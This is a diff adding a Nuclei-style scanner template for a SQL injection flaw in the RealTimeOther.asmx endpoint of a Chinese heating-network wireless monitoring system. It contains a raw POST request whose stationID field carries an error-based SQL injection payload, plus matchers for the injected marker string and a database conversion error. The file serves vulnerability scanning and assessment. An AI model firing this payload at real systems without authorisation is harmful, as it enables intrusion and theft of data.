@@ -1,0 +1,26 @@
+id: rewang-RealTimeOther-sql
+
+info:
+  name: 热网无线监测系统 RealTimeOther.asmx 存在SQL注入漏洞
+  author: hrewangl
+  severity: high
+  tags: rewang
+
+http:
+  - raw:
+      - |
+        POST /DataSrvs/RealTimeOther.asmx/ChangeStationToOld HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/x-www-form-urlencoded
+
+        stationID=%28SELECT+CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28CASE+WHEN+%289253%3D9253%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28113%29%29
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qjpxq1qbpjq'
+          - '转换成数据类型'
+        condition: and
